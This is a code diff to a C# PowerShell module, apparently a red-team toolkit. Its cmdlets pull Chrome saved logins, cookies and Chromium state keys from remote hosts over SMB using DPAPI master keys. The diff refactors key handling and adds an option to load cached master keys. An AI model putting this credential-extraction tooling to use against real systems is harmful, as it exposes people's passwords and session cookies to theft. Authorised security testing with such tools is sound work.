@@ -464,45 +464,6 @@ namespace Titanis.Tbo.Smb2.PowerShell
 			}
 		}
 
-		internal static IReadOnlyDictionary<Guid, byte[]> BuildMasterKeySet(
-			IEnumerable<TboDpapiMasterKeyInfo>? masterKeys,
-			Action<string>? logWarning,
-			string context)
-		{
-			logWarning ??= _ => { };
-			context = string.IsNullOrWhiteSpace(context) ? "BuildMasterKeySet" : context;
-
-			if (masterKeys == null)
-				return new Dictionary<Guid, byte[]>();
-
-			var results = new Dictionary<Guid, byte[]>();
-			foreach (var entry in masterKeys)
-			{
-				if (entry == null)
-					continue;
-				if (string.IsNullOrWhiteSpace(entry.MasterKeyGuid) || string.IsNullOrWhiteSpace(entry.MasterKey))
-					continue;
-				if (!Guid.TryParse(entry.MasterKeyGuid, out var guid))
-					continue;
-
-				byte[] keyBytes;
-				try
-				{
-					keyBytes = BinaryHelper.ParseHexString(entry.MasterKey.AsSpan());
-				}
-				catch (Exception ex)
-				{
-					logWarning($"{context} failed to parse master key {entry.MasterKeyGuid}: {ex.Message}");
-					continue;
-				}
-
-				if (keyBytes.Length == 0)
-					continue;
-				results[guid] = keyBytes;
-			}
-
-			return results;
-		}
 	}
 
 	internal static class ChromeCrypto
@@ -1095,8 +1056,14 @@ namespace Titanis.Tbo.Smb2.PowerShell
 		[Parameter]
 		public string[]? UserName { get; set; }
 
-		[Parameter(Mandatory = true)]
+		[Parameter]
 		public TboDpapiMasterKeyInfo[]? MasterKeys { get; set; }
+
+		[Parameter]
+		public SwitchParameter Cache { get; set; }
+
+		[Parameter]
+		public string? CachePath { get; set; }
 
 		private CancellationTokenSource? _cancelSource;
 
@@ -1119,7 +1086,17 @@ namespace Titanis.Tbo.Smb2.PowerShell
 				? ChromeHelpers.DefaultProfileName
 				: this.ProfileName.Trim();
 
-			var masterKeySet = ChromeHelpers.BuildMasterKeySet(this.MasterKeys, msg => this.LogWarning(smb, msg), "Get-TBOChromeLogins");
+			var masterKeySet = DpapiHelpers.BuildMasterKeySet(this.MasterKeys, msg => this.LogWarning(smb, msg), "Get-TBOChromeLogins");
+			if (this.ResolveCacheIngestionEnabled(this.Cache))
+			{
+				var cached = DpapiHelpers.LoadCachedMasterKeys(this.CachePath, serverName, msg => this.LogVerbose(smb, msg), msg => this.LogWarning(smb, msg));
+				DpapiHelpers.MergeMasterKeySets(masterKeySet, cached);
+			}
+			if (masterKeySet.Count == 0)
+			{
+				this.LogWarning(smb, "Get-TBOChromeLogins: no master keys available (supply -MasterKeys or enable -Cache).");
+				return;
+			}
 			var userFilters = ChromeHelpers.BuildUserFilters(this.UserName);
 			var users = ChromeHelpers.EnumerateUserDirectories(
 				smb,
@@ -1332,8 +1309,14 @@ namespace Titanis.Tbo.Smb2.PowerShell
 		[Parameter]
 		public string[]? UserName { get; set; }
 
-		[Parameter(Mandatory = true)]
+		[Parameter]
 		public TboDpapiMasterKeyInfo[]? MasterKeys { get; set; }
+
+		[Parameter]
+		public SwitchParameter Cache { get; set; }
+
+		[Parameter]
+		public string? CachePath { get; set; }
 
 		private CancellationTokenSource? _cancelSource;
 
@@ -1356,7 +1339,17 @@ namespace Titanis.Tbo.Smb2.PowerShell
 				? ChromeHelpers.DefaultProfileName
 				: this.ProfileName.Trim();
 
-			var masterKeySet = ChromeHelpers.BuildMasterKeySet(this.MasterKeys, msg => this.LogWarning(smb, msg), "Get-TBOChromeCookies");
+			var masterKeySet = DpapiHelpers.BuildMasterKeySet(this.MasterKeys, msg => this.LogWarning(smb, msg), "Get-TBOChromeCookies");
+			if (this.ResolveCacheIngestionEnabled(this.Cache))
+			{
+				var cached = DpapiHelpers.LoadCachedMasterKeys(this.CachePath, serverName, msg => this.LogVerbose(smb, msg), msg => this.LogWarning(smb, msg));
+				DpapiHelpers.MergeMasterKeySets(masterKeySet, cached);
+			}
+			if (masterKeySet.Count == 0)
+			{
+				this.LogWarning(smb, "Get-TBOChromeCookies: no master keys available (supply -MasterKeys or enable -Cache).");
+				return;
+			}
 			var userFilters = ChromeHelpers.BuildUserFilters(this.UserName);
 			var users = ChromeHelpers.EnumerateUserDirectories(
 				smb,
@@ -1584,8 +1577,14 @@ namespace Titanis.Tbo.Smb2.PowerShell
 		[Parameter]
 		public string[]? UserName { get; set; }
 
-		[Parameter(Mandatory = true)]
+		[Parameter]
 		public TboDpapiMasterKeyInfo[]? MasterKeys { get; set; }
+
+		[Parameter]
+		public SwitchParameter Cache { get; set; }
+
+		[Parameter]
+		public string? CachePath { get; set; }
 
 		private CancellationTokenSource? _cancelSource;
 
@@ -1604,7 +1603,17 @@ namespace Titanis.Tbo.Smb2.PowerShell
 
 			var browser = ChromeHelpers.NormalizeBrowserName(this.Browser);
 
-			var masterKeySet = ChromeHelpers.BuildMasterKeySet(this.MasterKeys, msg => this.LogWarning(smb, msg), "Get-TBOChromiumStateKeys");
+			var masterKeySet = DpapiHelpers.BuildMasterKeySet(this.MasterKeys, msg => this.LogWarning(smb, msg), "Get-TBOChromiumStateKeys");
+			if (this.ResolveCacheIngestionEnabled(this.Cache))
+			{
+				var cached = DpapiHelpers.LoadCachedMasterKeys(this.CachePath, serverName, msg => this.LogVerbose(smb, msg), msg => this.LogWarning(smb, msg));
+				DpapiHelpers.MergeMasterKeySets(masterKeySet, cached);
+			}
+			if (masterKeySet.Count == 0)
+			{
+				this.LogWarning(smb, "Get-TBOChromiumStateKeys: no master keys available (supply -MasterKeys or enable -Cache).");
+				return;
+			}
 			var userFilters = ChromeHelpers.BuildUserFilters(this.UserName);
 			var users = ChromeHelpers.EnumerateUserDirectories(
 				smb,
